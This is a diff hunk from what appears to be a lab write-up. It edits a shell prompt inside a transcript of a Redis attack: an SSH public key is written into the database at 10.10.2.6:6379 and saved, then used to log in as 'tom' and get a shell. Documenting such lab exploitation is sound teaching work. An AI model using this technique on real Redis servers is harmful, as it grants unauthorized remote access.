@@ -78,7 +78,7 @@ OK
 10.10.2.6:6379> set x "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCafYcuD2EjCyIuAvH91VAcqvxpWiEhYXO0/OXXKNBoFTF1texYXWaQPAReMOm8SsPDEy9rbN27QCMbKHDqQWndf2plQVEAWd3T/2XvMiSqzFN9xyGInoNdee2aHJXtll2IR2EfmmMOfuRt1Bl7YWgLdMht6FjmvccNytPl3pKEd/A+vBW1E7+RY4Y+hVfjQ8QMet0HLoCwunBa7x/EZf7SioYLrrA8jnqUBJDJnGJqrBZ9NzLiGzcbMVS8oUS5NP3iyZ9BP3GBATKzQOF1CLocYXsy+JCBd/igy2TFuWYfh//cRzDglqrYqDbLraBdTUhEAsvZVe+Gtd+6ZP9vfjvh a@b\n\n"
 10.10.2.6:6379> save
 10.10.2.6:6379>
-simeiz :: /tmp/example » ssh tom@10.10.2.6 -i /tmp/example/id_rsa
+$ ssh tom@10.10.2.6 -i /tmp/example/id_rsa
 Last login: Tue Oct 23 17:36:54 2018 from 10.10.254.1
 tom@9f10564a2db5:~$ #w00tw00t
 ```
